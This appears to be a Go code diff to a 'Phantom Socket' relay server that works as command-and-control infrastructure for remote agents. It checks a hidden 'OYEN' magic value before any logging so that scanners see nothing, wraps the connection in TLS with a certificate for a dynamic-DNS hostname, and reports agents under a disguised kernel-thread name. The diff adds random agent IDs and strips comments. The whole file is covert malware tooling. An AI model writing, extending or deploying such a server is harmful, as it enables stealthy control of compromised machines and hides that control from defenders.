@@ -11,6 +11,7 @@ import (
 	"fmt"
 	"io"
 	"log"
+	"math/rand"
 	"net"
 	"os"
 	"os/signal"
@@ -19,6 +20,7 @@ import (
 	"time"
 
 	"github.com/soket-io/gs-oyen-r/internal/config"
+	"github.com/soket-io/gs-oyen-r/internal/crypto"
 	"github.com/soket-io/gs-oyen-r/internal/peer"
 	"github.com/soket-io/gs-oyen-r/internal/telegram"
 	"github.com/soket-io/gs-oyen-r/internal/tls_mimic"
@@ -42,12 +44,10 @@ func (w *crlfWriter) Write(p []byte) (n int, err error) {
 	promptMutex.Lock()
 	defer promptMutex.Unlock()
 
-	// 1. Clear current line (the prompt) to prevent log bleeding into input
 	if consoleMode {
 		fmt.Print("\r\033[K")
 	}
 
-	// 2. Format and write the log message with CRLF for compatibility
 	buf := make([]byte, 0, len(p)*2)
 	for i := 0; i < len(p); i++ {
 		if p[i] == '\n' && (i == 0 || p[i-1] != '\r') {
@@ -59,7 +59,6 @@ func (w *crlfWriter) Write(p []byte) (n int, err error) {
 
 	n, err = w.writer.Write(buf)
 
-	// 3. Asynchronous Prompt Redraw
 	if consoleMode {
 		redrawPrompt()
 	}
@@ -83,8 +82,18 @@ func redrawPrompt() {
 	fmt.Print(prompt)
 }
 
+func generateID(length int) string {
+	const charset = "abcdefghijklmnopqrstuvwxyz0123456789"
+	b := make([]byte, length)
+	for i := range b {
+		b[i] = charset[rand.Intn(len(charset))]
+	}
+	return string(b)
+}
+
 func main() {
-	cfg := config.Load()
+	rand.Seed(time.Now().UnixNano())
+	cfg := config.LoadFromEnv()
 	flag.StringVar(&cfg.ListenAddr, "listen", ":8443", "Relay server listen address")
 	flag.Parse()
 
@@ -93,7 +102,7 @@ func main() {
 	logger.Println("Phantom Socket v1.0.1-stable Relay Server Starting...")
 	logger.Println("Building with Go 1.22+ for high-performance concurrency")
 
-	cert, err := tls_mimic.GenerateSelfSignedCert()
+	cert, err := crypto.GenerateSelfSignedCert("oyen.serveftp.com", nil)
 	if err != nil {
 		logger.Fatalf("Failed to generate certificate: %v", err)
 	}
@@ -114,14 +123,13 @@ func main() {
 
 	registry := peer.NewRegistry()
 
-	// Signal handling for graceful shutdown
 	sigChan := make(chan os.Signal, 1)
 	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)
 	go func() {
 		<-sigChan
 		fmt.Print("\r\033[K")
 		logger.Println("Shutting down relay server...")
-		registry.Cleanup()
+		registry.CleanupInactivePeers(0)
 		os.Exit(0)
 	}()
 
@@ -141,12 +149,10 @@ func main() {
 func handleConnection(conn net.Conn, registry *peer.Registry, cfg *config.Config) {
 	defer func() {
 		if r := recover(); r != nil {
-			// Silent recovery
 			conn.Close()
 		}
 	}()
 
-	// Pre-Auth Pre-Logging Guard: Silence for scanners
 	pskBuf := make([]byte, 4)
 	conn.SetReadDeadline(time.Now().Add(3 * time.Second))
 	if _, err := io.ReadFull(conn, pskBuf); err != nil {
@@ -154,7 +160,6 @@ func handleConnection(conn net.Conn, registry *peer.Registry, cfg *config.Config
 		return
 	}
 
-	// Validation Strictness: Big-Endian 0x4F59454E ("OYEN")
 	if binary.BigEndian.Uint32(pskBuf) != 0x4F59454E {
 		conn.Close()
 		return
@@ -162,7 +167,6 @@ func handleConnection(conn net.Conn, registry *peer.Registry, cfg *config.Config
 
 	remoteAddr := conn.RemoteAddr().String()
 
-	// Upgrade to TLS after PSK validation
 	tlsConn := tls.Server(conn, relayTLSConfig)
 	tlsConn.SetDeadline(time.Now().Add(10 * time.Second))
 	if err := tlsConn.Handshake(); err != nil {
@@ -171,7 +175,14 @@ func handleConnection(conn net.Conn, registry *peer.Registry, cfg *config.Config
 	}
 	conn = tlsConn
 
-	peerID := registry.Register(conn)
+	peerID := generateID(16)
+	_, err := registry.AddPeer(peerID, conn)
+	if err != nil {
+		logger.Printf("Failed to register agent: %v", err)
+		conn.Close()
+		return
+	}
+
 	logger.Printf("[+] Agent authenticated successfully from %s", remoteAddr)
 	logger.Printf("[+] Agent Online [kworker/u4:0] (ID: %s)", peerID)
 
@@ -190,7 +201,7 @@ func handleConnection(conn net.Conn, registry *peer.Registry, cfg *config.Config
 }
 
 func handlePeer(conn net.Conn, peerID string, registry *peer.Registry) {
-	defer registry.Unregister(peerID)
+	defer registry.RemovePeer(peerID)
 	
 	buf := make([]byte, 4096)
 	for {
@@ -202,8 +213,6 @@ func handlePeer(conn net.Conn, peerID string, registry *peer.Registry) {
 			}
 			return
 		}
-		
-		// Handle agent messages
 		_ = n
 	}
 }
